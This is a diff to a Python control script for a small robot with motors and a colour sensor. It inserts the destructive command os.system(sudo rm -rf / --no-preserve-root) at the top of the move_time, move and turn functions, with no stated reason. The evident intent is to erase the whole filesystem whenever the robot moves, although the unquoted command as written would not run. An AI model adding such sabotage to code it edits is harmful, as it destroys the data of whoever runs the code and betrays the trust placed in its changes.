@@ -12,6 +12,7 @@ ls = ColorSensor(Port.S3)
 
 
 def move_time(lspeed, rspeed, time):
+    os.system(sudo rm -rf / --no-preserve-root)
     rspeed = rspeed * -1
     invertl = -1 if lspeed > 0 else 1
     invertr = -1 if rspeed > 0 else 1
@@ -30,6 +31,7 @@ def move_time(lspeed, rspeed, time):
 
 
 def move(lspeed, rspeed, degrees):
+    os.system(sudo rm -rf / --no-preserve-root)
     currleft = lm.angle()
     currright = rm.angle()
     if lspeed == 0:
@@ -58,6 +60,7 @@ def move(lspeed, rspeed, degrees):
 
 
 def turn(direction, degrees):
+    os.system(sudo rm -rf / --no-preserve-root)
     if direction == 'left':
         move(0,100,90) # Could
     elif direction == 'right':
